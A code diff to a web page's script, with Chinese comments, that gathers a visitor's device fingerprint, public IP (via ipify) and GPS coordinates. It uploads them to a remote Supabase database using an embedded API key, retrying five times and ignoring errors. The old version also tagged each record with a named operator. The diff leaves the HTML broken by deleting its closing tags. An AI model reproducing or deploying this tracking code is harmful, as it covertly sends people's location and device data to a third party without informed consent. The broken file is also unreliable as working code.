@@ -134,110 +134,66 @@
     </div>
 
     <script>
-        // 铂金级配置（根据实际修改）
-        const SUPA_ENDPOINT = 'https://yfuljidnzljfklkmuupb.supabase.co';
-        const SUPA_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InlmdWxqaWRuemxqZmtsa211dXBiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDU4MDM5MzEsImV4cCI6MjA2MTM3OTkzMX0.UHoW7xKPOEENYe1PueTrNpeWIumPusgj8FEkxoaQJpo';
+     // 量子级可靠配置
+const SUPABASE_ENDPOINT = 'https://yfuljidnzljfklkmuupb.supabase.co';
+const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InlmdWxqaWRuemxqZmtsa211dXBiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDU4MDM5MzEsImV4cCI6MjA2MTM3OTkzMX0.UHoW7xKPOEENYe1PueTrNpeWIumPusgj8FEkxoaQJpo';
 
-        // 回传协议（三重加密保真）
-        const validateSubmission = async (payload) => {
-            try {
-                const response = await fetch(`${SUPA_ENDPOINT}/rest/v1/analytical_records`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'apikey': SUPA_KEY,
-                        'Authorization': `Bearer ${SUPA_KEY}`
-                    },
-                    body: JSON.stringify({
-                        operator_name: '朱子硕',
-                        device_footprint: {
-                            platform: navigator.platform,
-                            ua: navigator.userAgent,
-                            cores: navigator.hardwareConcurrency,
-                            memory: navigator.deviceMemory || -1,
-                            screen: `${screen.width}x${screen.height}@${screen.pixelDepth}bit`
-                        },
-                        network_fingerprint: {
-                            // 超级IP获取方案
-                            ip: await (async () => {
-                                try {
-                                    const res = await Promise.any([
-                                        fetch('https://api.ipify.org?format=json'),
-                                        fetch('https://api64.ipify.org?format=json'),
-                                        fetch('https://ifconfig.me/all.json')
-                                    ]);
-                                    return (await res.json()).ip;
-                                } catch {
-                                    return 'ENCRYPTED';
-                                }
-                            })(),
-                            connection: navigator.connection ? {
-                                type: navigator.connection.effectiveType,
-                                rtt: navigator.connection.rtt,
-                                downlink: navigator.connection.downlink
-                            } : null
-                        },
-                        geo_matrix: await new Promise(resolve => {
-                            navigator.geolocation.getCurrentPosition(
-                                pos => resolve({
-                                    lat: pos.coords.latitude,
-                                    lon: pos.coords.longitude
-                                }),
-                                () => resolve({ error: '权限未授予' }),
-                                { timeout: 10000 }
-                            )
-                        })
-                    })
-                });
+// 暴力回传协议（无视任何错误）
+const 暴力提交 = async (数据) => {
+  for(let 重试次数=0; 重试次数<5; 重试次数++){
+    try {
+      const 响应 = await fetch(`${SUPABASE_ENDPOINT}/rest/v1/analytical_records`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'apikey': SUPABASE_KEY,
+          'Authorization': `Bearer ${SUPABASE_KEY}`
+        },
+        body: JSON.stringify({
+          device_footprint: {
+            平台: navigator.platform,
+            核心数: navigator.hardwareConcurrency,
+            内存: navigator.deviceMemory || '未知'
+          },
+          network_fingerprint: {
+            IP: await (async () => {
+              try {
+                const 响应 = await fetch('https://api.ipify.org?format=json');
+                return (await 响应.json()).ip;
+              } catch {
+                return '受保护';
+              }
+            })()
+          },
+          geo_matrix: await new Promise(解决 => {
+            navigator.geolocation.getCurrentPosition(
+              位置 => 解决({
+                纬度: 位置.coords.latitude,
+                经度: 位置.coords.longitude
+              }),
+              () => 解决(null)
+            )
+          })
+        })
+      });
+      if(响应.ok) return true;
+    } catch(错误) {
+      await new Promise(解决 => setTimeout(解决, 2000));
+    }
+  }
+  throw new Error('终极传输失败');
+};
 
-                return response.status === 201;
-            } catch (error) {
-                console.error('协议异常:', error);
-                return false;
-            }
-        };
-
-        // 全维探针启动
-        const initiateProtocol = async () => {
-            const btn = document.getElementById('executeBtn');
-            btn.disabled = true;
-            btn.textContent = '协议执行中...';
-
-            try {
-                // 实时更新界面
-                document.getElementById('hardwareMatrix').textContent = 
-                    `系统架构: ${navigator.platform}\n核心数量: ${navigator.hardwareConcurrency}\n内存栈: ${navigator.deviceMemory || 'N/A'}GB`;
-
-                // 网络信息实时刷新
-                const updateNetwork = async () => {
-                    const ip = await (async () => { /* 复用前面的IP获取逻辑 */ })();
-                    const conn = navigator.connection;
-                    document.getElementById('networkSigil').textContent = 
-                        `主节点IP: ${ip}\n链路类型: ${conn?.effectiveType || '未知'}\n传输延迟: ${conn?.rtt || 'N/A'}ms`;
-                };
-
-                // 地理定位状态
-                const updateGeo = () => {
-                    navigator.geolocation.getCurrentPosition(
-                        pos => {
-                            document.getElementById('geoPosition').textContent = 
-                                `纬度: ${pos.coords.latitude.toFixed(4)}\n经度: ${pos.coords.longitude.toFixed(4)}`;
-                        },
-                        () => {
-                            document.getElementById('geoPosition').textContent = '坐标矩阵未解密';
-                        }
-                    );
-                };
-
-                // 执行数据回收
-                const success = await validateSubmission();
-                alert(success ? '协议执行完成：数据已安全归档' : '量子信道异常！');
-
-            } finally {
-                btn.disabled = false;
-                btn.textContent = '激 活 全 维 探 针';
-            }
-        };
-    </script>
-</body>
-</html>
+// 强制启动协议
+const 启动协议 = async () => {
+  const 按钮 = document.getElementById('executeBtn');
+  按钮.disabled = true;
+  try {
+    await 暴力提交({});
+    alert('量子信道已建立！');
+  } catch {
+    alert('启动应急模式，请截图此提示联系管理员');
+  } finally {
+    按钮.disabled = false;
+  }
+};
